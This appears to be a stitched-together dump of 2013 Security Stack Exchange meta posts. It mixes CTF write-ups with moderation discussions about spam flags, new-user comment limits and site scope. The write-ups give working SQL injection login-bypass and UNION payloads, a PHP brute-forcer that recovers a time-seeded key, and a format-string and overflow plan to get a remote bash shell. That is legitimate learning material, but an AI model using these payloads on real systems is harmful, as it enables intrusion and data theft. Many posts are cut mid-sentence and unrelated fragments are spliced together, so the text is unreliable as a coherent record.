<pre><code>[........................]fh[.....]f5[.....9]e[8..]f4e5fdf[8.......]e_e3e4f5
</code></pre>

<p>One possibility is</p>

<pre><code>ccccccccfhe2f5f_eaf4e5fdf2cce_e3e4f5
</code></pre>

<p>which we then translate back to the usual hex digits, xor with <code>$str2auth</code>, and to the string</p>

<pre><code>DDDDyj}pb|muzD`kl}
||||AREHZDUMB|XSTE
</code></pre>

<p>We're almost there, but we can't have a lone <code>X</code>. Fortunately we can pick the character before the <code>X</code>. Before X doubling:</p>

<pre><code>XXAREHZDUMBXSTE
</code></pre>

<p>Try it online a few times (there's a 1/20 chance that the script will draw 8 as the auth key each time), and soon enough:</p>

<pre><code>$ print -l 8 XXArEHZDUMBXSTE | nc 192.73.237.148 3002

1260,2,2013-05-02T07:28:33.597,4,,"<p>Here's the part from <a href=""https://meta.stackexchange.com/questions/58032/how-does-the-spam-flag-work"">the relevant Meta.SO answer</a></p>

<h2>What is the effect of the <em>Spam</em> flag?</h2>

<p>This type of flag receives an extremely high priority in the moderation queue. It should be used only when the content of the post you are flagging meets the criteria defined below, or it will likely be declined.</p>

<p>The spam flag is designed to eliminate posts with no relevant content and to penalize the authors:</p>

<ul>
<li>3 flags (spam or offensive): post is banished from the front page.</li>
<li>6 flags (spam or offensive): post is <a href=""https://meta.stackexchange.com/questions/22228/what-is-a-locked-post"">locked</a>, deleted, and the first revision owner loses 100 reputation.</li>
<li>1 flag from a moderator has the same effect as 6 flags from normal users: instant destruction.</li>
<li>Because a question with 6 flags is locked, a 10k reputation user cannot meaningfully undelete it.</li>
<li>Each spam flag counts as a downvote for calculating the post's score <em>(it does not affect the user's reputation)</em>.</li>
</ul>

<h2>Is there any way to remove <em>Spam</em> flags?</h2>

<p>There is often no need, as spam flags expire after 48 hours if the thresholds aren't reached.</p>

<p>Rolling back a post to a previous state will revert to the number of spam flags from that particular revision.  This allows the OP (or someone else with edit rights) to rollback a post that someone else made spam in a later revision.  However, as a general user, once you mark a post as spam, you cannot take it back.</p>

<h2>How does the <em>Spam</em> flag differ from the <em>Offensive</em> flag?</h2>

<p>There is no functional difference aside from separate counts - 3/6 of either will be sufficient for mechanical purposes.</p>

<hr>

<p>Personally, this is what I usually do:</p>

<ol>
<li>Flag as SPAM.</li>
<li>Edit out the spammy part.</li>
<li>A mod eventually will come and look at it and check the user.</li>

<h2>CRY100: Espionage</h2>

<p>We get two encrypted files, a decryption program, and the password for one of the files. The plaintext for the file we can decrypt is formatted like an email, which suggests that the other may be too. It's likely that the second file begins with <code>From: Vlugge Japie &lt;vl.japie@yahoo.com&gt;</code> or with <code>From: Baron van Neemweggen &lt;b.neemweggen@zmail.com&gt;</code>.</p>

<p>The encryption algorithm is a stream cipher. The keystream is derived from the password as follows:</p>

<ul>
<li>Apply some function <code>h</code> to the password 20000 times to get the first 16 bytes of keystream.</li>
<li>Given a chunk <code>k</code> of keystream, the next chunk is <code>h(k || s)</code> where <code>s</code> is some constant string (the length of the message in decimal).</li>
</ul>

<p>Oh, look: each chunk of keystream only depends on the previous chunk! So if we can guess one chunk, we can decrypt the message starting at that chunk. Earlier we saw that we had a good guess for the first chunk, so let's plug it in. We can reuse the supplied Python code, just remove the initial key generation step from the <code>crypt</code> function.</p>

1288,2,2013-06-02T06:42:57.950,5,,"<h1>BIN100: Dice Game</h1>

<p>What at first glance seemed to be a simple reversing challenge had a sting in its tail which led to me spending far more time than I should have figuring it out.</p>

<p>Running the executable yields a dice game interface, where the user presses return to throw the dice. The value rolled is randomly generated 1-6. To win the game, you have to roll 5 specific numbers in order; <code>3-1-3-3-7</code>, if at any point you throw an incorrect number the program terminates.</p>

<p><em>If your first thought at this stage, like mine, is that this space is easily brute forced - why not just let the random rolls hit it eventually - it's worth noting that we might be waiting a while to roll a 7.</em></p>

<p>So the first stage was just a case of firing up Immunity and pausing the execution at the first dice roll. Stepping through the program quite quickly showed the call to <code>rand()</code> that was being used to generate the rolls.</p>

<p><img src=""https://i.stack.imgur.com/E0yWr.jpg"" alt=""Immunity with freehand circles""></p>

<p>A carefully placed breakpoint at the moment the <code>rand()</code> result was loaded into <code>eax</code> meant that I could replace it with whatever value I wanted.</p>

<p><img src=""https://i.stack.imgur.com/sT6ae.jpg"" alt=""Command Prompt with freehand circles""></p>

<p>Unfortunately, due to what I thought at the time was loop-unrolling, the 5 calls to <code>rand()</code> appear separately, so I had to repeat the process above for each roll offset.</p>

<p>So now we can run the program, and at each dice roll edit the result so that we get <code>3-1-3-3-7</code>. Too easy, right? Unfortunately this is not enough. Despite rolling the required numbers, the program terminates with a message</p>

<blockquote>
  <p>[!] It seems you did something wrong :( No flag for you.</p>
</blockquote>

<p>And this is where I started wasting time. I assumed that I had not 'synthesized' the dice rolls in exactly the way that was required. I was led to this assumption by the fact that on the final roll my prompt always <em>drew</em> the dice-roll for 3, even though the text underneath read that I had rolled a 7.</p>

<p>The first thing I did was track down the branch that was taking me to the 'something wrong' message, and patched it to reverse its decision.</p>

<p>This resulted in me getting the success message, but a garbled flag. So the 'something wrong' message was right - somehow the flag generation hadn't happened as it should.</p>

<p>Anyway, <strong>much</strong> head-scratching later, I revisited something I had noticed earlier while browsing the overview in IDA. There were lots of calls to <code>time()</code>. This program was making use of system time somehow.</p>

<p>Closer inspection showed that it was saving a timestamp each time a roll was made and the timestamp for the current roll was being compared to the timestamp for the previous roll.</p>

<p><img src=""https://i.stack.imgur.com/fE7gd.jpg"" alt=""enter image description here""></p>

<p>Essentially, if the time taken between any two consecutive dice rolls was ever greater than 2 seconds, a certain code fragment was executed. This code fragment stomped on the flag generation address, garbling it.</p>

<p>So I patched each of these <code>cmp [var], 2</code> instructions to read <code>cmp [var], 0x7f</code>. Annddd...</p>

<blockquote>
  <p>[!] It seems you did something wrong :( No flag for you.</p>
</blockquote>

<p>There was one last, glaringly obvious thing I missed:</p>

<p><img src=""https://i.stack.imgur.com/0UbFx.jpg"" alt=""enter image description here""></p>

<p>Again, patching this branch to reverse its decision in Immunity and the flag was presented, ungarbled.</p>

<p>the iPad one got closed at the domain admin password one has three close votes as it stands at the moment.</p>

<p>What I'd be interested to know is a bit more detail on why these are off-topic/bad questions?  </p>

<p>Here's my take on it.  the iPad one is a scenario that is quite commonly faced and relates to security.  A relative dies and you need access to their computing equipment to close accounts/get contact details etc.</p>

<p>Isn't it a valid question to ask whether there is a legitimate way to bypass the security of the device to enable their relatives to achieve this task? The answer may well be ""no there's no way of doing that I'm afraid"" but that doesn't invalidate the question.</p>

<p>Same with the question on the person saying that they've forgotten their domain password and are looking to get access to the DC.  I'm not sure I see why that's not a legitimate query, it seems like a possible scenario (admins do forget passwords) and related to security.</p>

1303,1,2013-06-14T18:11:52.777,12,215,"<p>In <a href=""https://security.stackexchange.com/questions/37437/unknown-asian-chinese-registry-keys"">Unknown Asian/Chinese registry keys</a>, @user27140 described a security concern which @bobince then identified in his answer as a software bug with (apparently) <a href=""http://www.syncovery.com/"" rel=""nofollow noreferrer"">Syncovery</a>.  A new-minted user named @Syncovery then posted another answer stating ""Thanks for the report! It will be fixed in the next update.""</p>

<p>In a comment to @Syncovery's answer, @Xander pointed out that @Syncovery had provided a comment, not an answer, which is where it should have gone - but as a new-minted user, @Syncovery didn't have the reputation required to comment upon anything but his own post.</p>

<p>This seems to me to be less than ideal.  @Syncovery did ""the right thing"" - a problem with his software came to light; he went through the trouble of creating an account (and replacing the icon with what is presumably an accurate picture of himself) so that he could document that the vendor is aware of the problem and will fix it.  This puts the information people need - ""this will be fixed"" - right where they'll find it when they need it (while searching for ""What's this crazy Chinese registry key?"").  The policy disallowing comments for users without reputation prevented him from doing so properly; he did so in the only way he could.</p>

<p>There's a good reason for requiring reputation for comments, and this is an outlier case.  But is there anything that could alleviate this issue?  Perhaps allow new users at least one comment before they need to build reputation up?  That might permit valuable drive-bys without giving spammers and harassers the ability to paste comments over multiple posts without earning reputation.  </p>

<p>How many times has someone found a post here through Google and thought ""Gee, I have valuable information to add, this site looks good, but I can't add valuable information until I level up?""  Those people are going to go away and not come back.  But maybe if they can leave that one comment it's worth it for them to stick around, and end up being more involved.</p>

<p>Just thinkin' out loud.  I was going to post this in a comment to @Xander's comment but first I followed his link to <a href=""https://security.stackexchange.com/privileges/comment"">where comments are appropriate or not</a> and decided it belonged on Meta instead :)</p>

<p><em>Also, there is another security issue here - no verification that @Syncovery is actually in any way related to the <a href=""http://www.syncovery.com/"" rel=""nofollow noreferrer"">Syncovery</a> software; no authentication that he's qualified or authorized to speak to it as he did.

<p>That covers a vast majority of cases. In the rare cases where a comment would really be the right thing, there is a way to sneak it in: moderators can convert an answer to a comment.</p>

<p>In this case, Syncovery posted an answer which was converted to a comment by a moderator. There is no problem to solve here, the solution already exists and was applied.</p>

<p>Allowing users one comment would open the spam floodgates — spammers would create one account at a time, as they do now. Answers bump a thread to the front page, so spam is quickly spotted and eliminated; it would not be so with comment. That isn't the biggest problem with not allowing comments from new users though. Stack Exchange is a questions and answers site. That's something people who are new to SE often don't understand, because it differs significantly from the usual discussion interfaces. New users are forced to start with what constitutes the meat of the site: questions and answers. That gives them a bit of time to get used to how we do things.</p>

<p><strong>Solved jointly by randomdude and Manishearth, <a href=""http://labit.in/eng.php?id=1073"" rel=""nofollow noreferrer"">independently by p____h (while not on the team)</a></strong></p>

<p>The title was a pun on their prior announcement that ""<a href=""https://legitbs.net/"" rel=""nofollow noreferrer"">Web stuff won’t just be simple baby’s first SQLi this time</a>.""</p>

<p>I found this one interesting, because I've never dealt with SQLite till now. The injection we had discovered only allowed queries that returned 1x1 tables, and we had to work within that constraint.</p>

<p>From the outset, this one was a simple web form with a username and passwords field:</p>

<p><img src=""https://i.stack.imgur.com/gS5Ck.png"" alt=""enter image description here""></p>

<p>Initially, all login attempts failed. However, I noticed an interesting tidbit, the response headers of a failed login had an <code>X-Sql</code> header, which showed the exact SQL query being run (e.g. <code>X-Sql: select name from users where name = 'manish' and password = 'abcd' limit 1;</code>). This was useful, because now I knew the table and column name.</p>

<p>After a bit more experimentation, it was easy to get an injection:</p>

<pre><code>Username: root'/*
Password: */ or 1='1
</code></pre>

<p>which ran the query <code>select name from users where name = 'root'/*' and password = '*/ or 1='1' limit 1;</code></p>

<p>This gave <a href=""https://i.stack.imgur.com/zT0il.png"" rel=""nofollow noreferrer"">a success message</a>, but that's all. Furthermore, it only worked for <code>root</code>. (Later on we learned that it would also work for <code>user</code>)</p>

<p>Now, the only way for us to get the output of an sql query was to disguise it as the query of the users table, since the success message seemed to pull the username from the database.</p>

<p>@randomdude got there first (I was too busy wasting time with JOIN) with a UNION query</p>

<pre><code>Username: aaa'/* 
Password: */ union select password from users as name union select name from users where 1=2 or 1='1
</code></pre>

<p>It turned out that the password was <a href=""https://i.stack.imgur.com/Sp3Yb.png"" rel=""nofollow noreferrer"">""barking up the wrong tree""</a>. Hmph.</p>

<p>(Using a <code>Count(*)</code> query we also discovered that there was a second entry in the table, a user ""user"" and password ""password"")
So now we had to broaden our search. For that, we first needed database reflection. Trial-and-error would have worked (in retrospect), but it would be better if we could use reflection to determine the schema and then scoured it for the key.</p>

<p>Since each type of SQL is different especially when it comes to built in functions and reflection, we had to determine the database type.</p>

<p>Using the same user as above, and using the password <code>*/ union select sqlite_version() as name union select name from users where 1=2 or 1='1</code>, (after trying every other type of SQL under the sun), I was surprised to find out that it was SQLite (3.7.9) .</p>

<p>We first tried PRAGMA commands. However, unlike most commands in SQL which return table values, SQLite PRAGMA commands return a string. Now, in a single-column SELECT command (the format our injection was restricted to),  to get the value of a string <em>function</em> (function, not SQL command), we can run <code>SELECT func()</code>. Similarly, to get the value of a table-formatted SQL command, we can run <code>SELECT columnname FROM (SQL COMMAND)</code>.</p>

<p>However, the PRAGMA commands would give syntax errors if stuffed in on either side.</p>

<p>Fortunately, @randomdude remembered that there is a database <code>sqlite_master</code> in SQLite, quite similar to <code>information_schema</code> with respect to the data it contains. </p>

<p>Using the password <code>*/ union select sql from sqlite_master where type='table' union select name from users where 1=2 or 1='1</code>, we got that there was also a table <code>keys</code>, with a single column <code>value</code> (If this was not the first table in the database, an ORDER BY clause or a WHERE clause would have sufficed to bring it out). So, using the password <code>*/ union select value from keys  union select name from users where 1=2 or 1='1</code>, we got the string <code>The key is: literally online lolling on line WucGesJi</code></p>

<p>The goal here was to log in as ""admin"" and see the secret ""key"" belonging to admin. However, the web form wasn't letting users log in as admin.</p>

<p><strong>Solved jointly by p____h and Manishearth. Mainly by p___h</strong></p>

<p>Here, there was a link to a login form, as well as a link to <a href=""http://rememberme.shallweplayaga.me/getfile.php?filename=usernames.txt&amp;accesscode=60635c6862d44e8ac17dc5e144c66539"" rel=""nofollow"">usernames.txt</a> and <a href=""http://rememberme.shallweplayaga.me/getfile.php?filename=passwords.txt&amp;accesscode=60635c6862d44e8ac17dc5e144c66539"" rel=""nofollow"">passwords.txt</a>. Both were fetched by <code>getfile.php</code>, which had two GET parameters: a <code>filename</code>, and an <code>accesscode</code>, which seemed to be a 128-bit hash. The given URLs opened username.txt (a list of usernames), but gave an ""Invalid access code"" error for passwords.txt.</p>

<p>@p____h discovered that the <code>accesscode</code> was simply the md5 of the <code>filename</code>, giving the following password file: <a href=""http://rememberme.shallweplayaga.me/getfile.php?filename=passwords.txt&amp;accesscode=b55dcb609a2ee6ea10518b5fd88c610e"" rel=""nofollow"">http://rememberme.shallweplayaga.me/getfile.php?filename=passwords.txt&amp;accesscode=b55dcb609a2ee6ea10518b5fd88c610e</a></p>

<p>This was a basic Unix <code>/etc/passwd</code> file, which would be a pain to decrypt. However, it was a red herring and the login form was irrelevant to the challenge (in fact, we would later discover that it was rigged to ignore all requests)</p>

<p>@p____h tried to ask getfile.php to read itself, and <a href=""http://rememberme.shallweplayaga.me/getfile.php?filename=getfile.php&amp;accesscode=0701593e23e676eaba834916a6ac7272"" rel=""nofollow"">it obliged</a>. Here are the contents:</p>

<pre><code>$value = time();
$filename = $_GET[""filename""];
$accesscode = $_GET[""accesscode""];
if (md5($filename) == $accesscode){
echo ""Acces granted to $filename!

"";
srand($value);
if (in_array($filename, array('getfile.php', 'index.html', 'key.txt', 'login.php', 'passwords.txt', 'usernames.txt'))==TRUE){
$data = file_get_contents($filename);
if ($data !== FALSE) {
if ($filename == ""key.txt"") {
$key = rand();
$cyphertext = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $data, MCRYPT_MODE_CBC);
echo base64_encode($cyphertext);
}
else{
echo nl2br($data);
}

}
else{
echo ""File does not exist"";
}
}
else{
echo ""File does not exist"";
}

}
else{
echo ""Invalid access code"";
}
?&gt;
</code></pre>

<p>So <code>getfile.php</code> would directly display the contents of a set of file. However, it would encrypt the contents of <code>key.txt before displaying</code>. And sure enough, <a href=""http://rememberme.shallweplayaga.me/getfile.php?filename=key.txt&amp;accesscode=65c2a527098e1f7747eec58e1925b453"" rel=""nofollow"">key.txt contained a base64 encoded string that would change on refresh</a>.</p>

<p>The encryption algorithm was quite simple:</p>

<pre><code>srand(time()) //Set the random number generator seed to the current time, in seconds
$cyphertext = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, rand(), $data, MCRYPT_MODE_CBC);
echo base64_encode($cyphertext);
</code></pre>

<p>To decrypt it, we would simply have to run</p>

<pre><code>srand(time());
mcrypt_decrypt(MCRYPT_RIJNDAEL_128, rand(), base64_decode($keyfile), MCRYPT_MODE_CBC);
</code></pre>

<p>At the correct time. Since <code>time()</code> changes every second, the easiest thing to do would be to get the key value and loop through a small neighborhood of the current value of <code>time()</code>. (The small neighborhood needs to be on both sides, because one cannot be sure of synchronization between the two clocks)</p>

<p>I cooked up the following code:</p>

<pre><code>&lt;?php
error_reporting(0)
$c=base64_decode($argv[1]);
$a=time();
for($i=$a-200;$i&lt;$a+200;$i++){
  srand($i);
  echo ""\n"".$i."") "". mcrypt_decrypt(MCRYPT_RIJNDAEL_128, rand(), $c, MCRYPT_MODE_CBC);

}
</code></pre>

<p>On looking through the largely binary output, I got the key <code>To boldly go where no one has gone before WMx8reNS</code></p>

After some manual testing in Putty (in raw mode), we've extracted the initial solution that never changes and can be hard-coded into the client software, but the latter challenges obviously needed to be scripted. No human could complete them in time, and it turns out even computer programs would have problems to...</p>

<p>&nbsp;&nbsp;&nbsp;<img src=""https://i.stack.imgur.com/v2yXw.png"" alt=""Die Hard""></p>

<p><strong>Damn sockets</strong>:</p>

<p>So first thing to do was to write a client that would be capable of communicating with the server, sending commands and reading its responses to send more commands. This turned out not to be as easy, as it's honestly been quite a while since I've been programming raw TCP sockets, so the most challenging first part was actually finding stable socket library that allows for enough low level control to script both server commands for which no response is read, and for those that needed to wait for server's response and parse from it new values. This was important, because the game timed out, if the protagonist would linger for too long, as <em>the walls and the roof were collapsing around him</em>. Each waiting for server's response meant more danger of the world around your character collapsing, and failing the mission.</p>

<p>After quite a bit of trouble finding suitable library, I've opted for what I know to be a good and stable library - Indy 10 for Delphi. Yes, the ancient one, but in perfect working order and I don't mind programming in Object Pascal (nice language to learn programming, and many probably started with it as well). Next part was to then script the optimal pouring solutions, and be able to complete each room with as few commands as possible (while also waiting for server's response only when really needed to, i.e. to read next challenge values).</p>

<p>&nbsp;&nbsp;&nbsp;<img src=""https://i.stack.imgur.com/v1wPl.png"" alt=""Die Hard Ping Pong""></p>

<p><strong>The pouring solution</strong>:</p>

<p>This seemed to be the most straightforward task, pure programming <em>fun</em> with addition and subtraction logic in a <em><code>while</code></em> loop. The code could look something along the lines of this pseudo code:</p>

<pre><code>  writeln('get red jug');
  writeln('get blue jug');
  //jugs need to be filled to inspect their size
  writeln('fill red jug');
  writeln('fill blue jug');
  writeln('look inscription');
  //read our input values
  Red:= ReadFromInput(RedJugSize);
  Blue:= ReadFromInput(BlueJugSize);
  Scale:= ReadFromInput(TargetWeight);
  //set string substitutes for server commands
  Jugs[Blue &gt;= Red]:= 'blue';
  Jugs[Blue &lt; Red]:= 'red';
  //empty big jug
  Vals[True]:= 0;
  writeln('empty ' + Jugs[True] + ' jug');
  Vals[False]:= 0;
  //now loop the pouring between jugs until one of them matches the scale
  while !((Vals[True] = Scale) or (Vals[False] = Scale)) {
    //fill small jug
    Vals[False]:= Min(Red, Blue); 
    writeln('fill ' + Jugs[False] + ' jug');
    //pour small into big jug
    Vals[True]:= Vals[True] + Min(Red, Blue);
    writeln('pour ' + Jugs[False] + ' jug into ' + Jugs[True] + ' jug');
    //get difference in small jug
    Vals[False]:= Vals[True] - Max(Red, Blue);
    if Vals[True] &gt; Max(Red, Blue)
    then Vals[True]:= Max(Red, Blue);
    if Vals[False] &lt; 0 then Vals[False]:= 0;
    //empty big jug and pour small one into big one
    if (Vals[False] &gt; 0) {
      Vals[True]:= Vals[False];
      writeln('empty ' + Jugs[True] + ' jug');
      writeln('pour ' + Jugs[False] + ' jug into ' + Jugs[True] + ' jug');
    }
  }
  //decide which jug to put on scale, drop the other one
  writeln('put ' + Jugs[Vals[True] = Scale] + ' jug onto scale');
  writeln('drop ' + Jugs[Vals[True] != Scale] + ' jug');
  //progress to the next room
  writeln('n');
</code></pre>

<p>Now this algorithm was obviously later much optimized, but the gist of it is here:</p>

<ul>
<li>exit <code>while</code> loop as soon as you can, when one of the jugs is filled with required quantity</li>
<li>find shortcuts to poring solutions (i.e. is <code>Abs(Vals[True]-Vals[False])=Scale</code>)</li>
<li>decide, whether to switch jugs for pouring (i.e. is <code>Scale mod Vals[True] &gt; Scale mod Vals[False]</code>)</li>
<li>only wait for server response when absolutely necessary (two <code>write</code> commands, one doesn't wait)</li>
<li>...</li>
</ul>

<p><strong>The result</strong>:</p>

<p>Sadly, I wasn't able to complete all the required challenges to collect the flag. The best result I got was <strong>19 rooms solved</strong> (if the number of them was 20, then that's so close), but the code suffered from some bugs (basically, I've forgotten to include <code>&gt;=</code> where only <code>&gt;</code> was in the string substitution for the <code>blue jug</code>, resulting in hard to spot errors in mixing solutions with all the server's output, if the required scale value was equal to how much water blue jug holds, basically issuing a command <code>put jug onto scale</code> instead of <code>put blue jug onto scale</code>) that took too much time to identify, there were some other minor inefficiencies in decision where to wait for server's response and where not, and the late hours didn't help either. All of it resulted in nearly getting there, but not quite. Frustrating!</p>

<p>Still, the challenge was fun, I've refreshed my memory on raw socket programming, and given a bit more time to polish out the rough edges in my code, or even starting over without the burden of finding comfortable and powerful enough socket library, who knows, maybe I'd be able to collect the 2 points flag.</p>

<p><strong>Observations</strong>: It turns out there was nothing wrong with the application I wrote, and the ability to complete the challenge depended highly on internet speed (i.e. ping speed or distance to the server). Some other teams have been complaining about that fact as well (see for example comments to the <a href=""http://f00l.de/blog/def-con-ctf-2013-diehard/"" rel=""nofollow noreferrer"">F00ls Bl0g write-up</a>) and they still can't make flag collecting <em>python</em> scripts to work for them, and neither can I. </p>

<p>For our tries, I've compiled a <em>Win32</em> executable and uploaded it to my web server while the challenge lasted, but others that tried it didn't have much luck with it either (@D3C4FF, @Manishearth and others, none of us from US where the server was), but we did suspect there must be something amiss with the network lag, as the application progressed really fast where no server response was needed, and pretty slow where it was. Oh well...</p>

<blockquote>
  <p>IT Security Stack Exchange is for Information Security professionals to discuss protecting assets from threats and vulnerabilities. Topics include, but are not limited to:</p>

  incident response<br>
  physically securing the office, datacentre, information assets etc.</p>

<p>The last two topics are really the core of what you're asking. Incident Response being a largely soft topic, with technical aspects depending on the incident. Then the last is explicitly allowing physical security topics.

1319,2,2013-06-20T10:37:19.233,3,,"<h1>Exploitation 4 (annyong)</h1>

<p><strong>I (randomdude) didn't get this challenge solved</strong>, but I thought I'd share the progress I made on it. I'm also going to share some of the dead-ends I found myself investigating (hopefully the'll be useful as academic points).</p>

<p>The challenge gives us a binary and a server on which the binary is listening. We crack open the binary in IDA (<a href=""https://www.hex-rays.com/products/ida/support/download.shtml"" rel=""nofollow noreferrer"">download</a>), and after a quick look around, we find this: </p>

<p><img src=""https://i.stack.imgur.com/tCWpz.png"" alt=""IDA screenshot""></p>

<p>IDA makes the function pretty easy to read. The first thing that I saw in the function is a buffer overflow - the 'sub esp, 0x810' allocates 810 bytes of stack space for locals, but the value 0x900 is passed to fgets(). My first instinct was to attempt exploit of this - looks like a trivial stack buffer overflow, right?</p>

<p>So I set up a system and run the binary on it under GDB. I connect and send a lot of data to the daemon, and what do we get?</p>

<p>Woohoo, a crash! The data that I sent was along the lines of '_aaa_aab_aac', which makes it easy to see which registers were overwritten. We've obviously got control of RIP and RBP, which are pretty important.
What's happened here is that the call to fgets has corrupted the return address from sub_108C on the stack, and once sub_108C returns, it uses overwritten data as RIP.
So, being old-school, I thought I was home and dry at this point. I set RIP to the stack address and put some shellcode on the stack, aaand - nothing. Well, just a segfault.</p>

<p>So it seems that since I last did this (yes, quite some time ago), people started marking their stacks as non-executable, which is causing this access violation. Things aren't quite as simple as we thought, but our control of these registers via the buffer overflow will still be useful.</p>

<p>So we go back to the code and take a look at the code again, and this time, we look closely at the printf() call. It's only passing one argument! That's a format string bug which should lead to code execution (if you need a quick primer on exploitation of format string vulns, see <a href=""https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf"" rel=""nofollow noreferrer"">this pdf</a>). Looking at the function in the supplied binary, though, we can see that input containing the character 'n' is rejected, meaning we can't use the traditional '%n' method of exploitation.</p>

<p>Perhaps we can use the buffer overflow we found earlier to circumvent this check. Since the buffer overflow gives us control of RIP, we could use it to jump directly to loc_10ED - the block of code which calls printf() - ignoring the check entirely. The sequence of events is the following:</p>

<p>1) fgets is called, is returned a very long string which contains an 'n' character
2) fgets leaves the area after our stack buffer corrupted
3) strchr() is called, and the function writes ""I don't think so"" and refuses to printf()
4) control returns to loc_1113, which then notes that the stack-based local var_4 is nonzeo and thus returns
5) a value from the corrupt stack is transferred in to RIP. Since we control this value, we set it to the location of loc_10ED.
6) printf() is called with the recieved data.</p>

<p>Sorted. So we set this up with GDB and woohoo - it works, in that we now get to printf() an unrestricted attacker-supplied string! </p>

<p>So next we need to exploit the (now unrestricted) heap overflow. The first instinct I had was to modify the function we are running, adding code to give us a shell. However, this is not the easy answer it sounds, because the code section is mapped read-only. We could generate a ROP chain to get to what we want (perhaps the better option, in retrospect), but instead I decided to use a ""%n""-style 4-byte overwrite to set a function pointer in the GOT (see <a href=""https://isisblogs.poly.edu/2011/06/01/relro-relocation-read-only/"" rel=""nofollow noreferrer"">here</a> for an explanation of the GOT and PLT). We don't need any complex payload - since stdin/out of the target binary are redirected over a socket, all we need to is to system(""/bin/bash"") to get a remote shell.</p>

<p>Looking at the provided binary, we can see that after printf is called, fgets() is called again with the same buffer as an argument. If we start the payload of our data with ""/bin/bash"", then we can change the fgets entry in the PLT to the address of system(), and we're sorted. So we have the following additional steps in our exploit, to occur after the printf():</p>

<p>7) a k-rad format string payload causes the fgets() function pointer to be changed to a pointer to system()
8) control passes to loc_1113, but (since we corrupted the stack) we ensure that this time, var_4 contains zero, causing the target not to exit, but to call fgets() again
9) the target attempts to call fgets, passing it a buffer filled with our data. Instead, system() is called.
10) a shell!</p>

<p>However, there's an important aspect I've skimmed over so far - we must discover some locations in memory, since memory layout is randomised on each load of the target. We need:</p>

<ul>
<li>The location that our stack buffer will be (so we can use an offset of that for our new stack after printf, thus controlling var_4)</li>
<li>The location of loc_10ED (so we can jump to it in step 8)</li>
<li>The location of system().</li>
</ul>

<p>These are easy to get, since we have a format string vuln - we can simply pass %p to glean values straight from the stack (and indeed, a few registers). We send a message comprising the string ""%08lx"" repeated, which yields that a pointer to a value on the stack as the fourth address, a pointer to somewhere in the code segment as the 283rd, and a return address in to libc (actually _start_main()) as the 267th. Our pointers don't need to be exact, since the stack and code are always aligned at a page boundary. We can find the location of loc_10ED by masking off the lower 2 bytes and adding 0x10ED, and the location of system() by adding a constant to the _start_main return address. Ace.</p>

<p>So our attack now comprises two steps:</p>

<p>1) Send one message, of a size too small to trigger the overflow, containing a number of ""0x%08lx"". This will leak enough information about the memory layout to perform the real attack.
2) trigger the overflow, use this to trigger a format string vuln without 'n' filtering, and overwrite the fgets() pointer.</p>

<p>So far, I've glossed over the 'exploit the format string vuln' stage. Remember that the first few args are passed in registers on x64 (remove then using '%c', since we need to precisely control how many characters are written so we can use %n as a write primitive), and use the time-honoured ""%XXXu%n"" to write data. Since libc seems to silently fail on large %u values, we use a max of 5000, and provide multiples - so if we wanted to set the memory location 10020, we'd use ""%5000u%5000u%20u%n"".
I ended up doing three overwrites to set a 64bit value 16 bits at a time (leaving the top 16 bits blank). The first overflow sets the bottom 16bits (making the middle 16 bits zero by necessity), and the second sets the middle 16, and the third the next 16. Unfortunately this means that the bottom 16bits must be less than the next 16, which must be less than the next 16. It was only after the context closed that I discovered that an 8bit write was possible, which would've made this much easier :D</p>

<p>So, after all that, our second-stage overflow ends up looking like this:</p>

<p>/bin/bash # [%c%c%c%c%c to use up the register args] [%5000u (repeat as neccessary)] [%..u] [%n to perform the PLT overwrite] [..] [nonzero value for first ebp-4] [..] [zero value for second ebp-4] [..] [new EBP for use after overflow] [new RIP - ie, pointer to loc_10ED] [args to pass to printf] [..]</p>

<p>I've only shown one overwrite in the format-string for clarity.</p>

<p>Amazingly, when I ran it against my Kali install, it works fine! It didn't, however, work against the target machine hosted by the CTF organisers. I think this is because of the hardcoded offset to system(). Unfortunately at this point I gave up and went to bed (having consumed enough caffeine to cause seismic activity). If I'd have worked out what build of libc the server was running, or simply tried all versions from common distributions, I would've been able to use that to find the correct offset to system() and thus get a shell. Note that I already had the location of libc in memory so, really, I had the hard part done.</p>

<p>Here's a huge-ass lump of incredibly poor C# which should work against Kali 1.0.3 32bit. As I say, it's poorly-written, horrible and generally bad! This isn't how I normally code!</p>

<p>This system make it easier for new users to recover from their initial mistakes: if they start with a couple of downvotes, it doesn't make a difference.</p>

<p>Users who would go significantly below 0 if it wasn't for the capping are rare cases. The system isn't designed around such extremes. There isn't much point anyway: usually, these users get discouraged. If they don't, they can be suspended for excessive low-quality contributions (that won't happen for one or two bad questions, but it can happen to persistent trolls). If they insist on coming back, they can create new accounts anyway, restarting from 1, so a reputation going below the starting point is ineffective as a deterrent or warning sign.</p>

1330,2,2013-06-27T14:13:51.243,8,,"<p>Absolutely a false dichotomy. In fact, usability and security are almost the same exact thing. Everyone should read <a href=""http://sid.toolness.org/ch13yee.pdf"" rel=""nofollow"">Guidelines and Strategies for Secure Interaction Design</a>. Here's a snip:</p>

<blockquote>
  <p>At the heart of the apparent conflict between security and usability is the idea that security makes operations harder, yet usability makes operations easier. Although this is usually true, it’s imprecise. Security isn’t about making all operations difficult; it’s about restricting access to operations with undesirable effects. Usability isn’t about making all operations easy, either; it’s about improving access to operations with desirable effects.</p>
  
  <p>Tension between the two arises to the extent that a system is unable to determine whether a particular result is desirable. Security and usability come into harmony when a system correctly interprets the user’s desires.</p>

1331,2,2013-06-28T20:05:11.523,3,,"<p>Nope.  I do not think this is a good direction.  Usable security is an entire subfield of computer security.  It's a rich area with many complexities, challenges, and techniques.  There's no way a single page is going to address everything within that domain.  Treating every question that touches on usability and security as out of scope would be unreasonable and harmful to the site.</p>

<p>If you still are in favor if this, I suggest you start by trying to create one question and posting some answers, then when you have that, come back with a more specific proposal.  Nothing stops you from creating a new question now that you think addresses common elements.  (Personally, I think it's going to be hard to create a single specific question that is both narrowly scoped enough to be a good fit for this site and yet broad enough for what you have in mind -- but feel free to give it a try and see what you come up with.  Maybe when I see something specific, you'll change my mind; I'll try to keep an open mind.)  Once you have a specific question and some concrete answers, then if you still think your proposal is a good idea, you could come back to us with a specific proposal about what questions you think should be marked as a duplicate of that one, and we could discuss it by looking at the specific questions.  But at this point, I think it would be premature to adopt your proposal.</p>

1333,2,2013-07-07T18:07:38.493,9,,"<p>Here's a write-up for the challenges that I participated in enough to follow the solution. We had several good team efforts, not all of these are my own work.</p>

<h1>11. mail</h1>

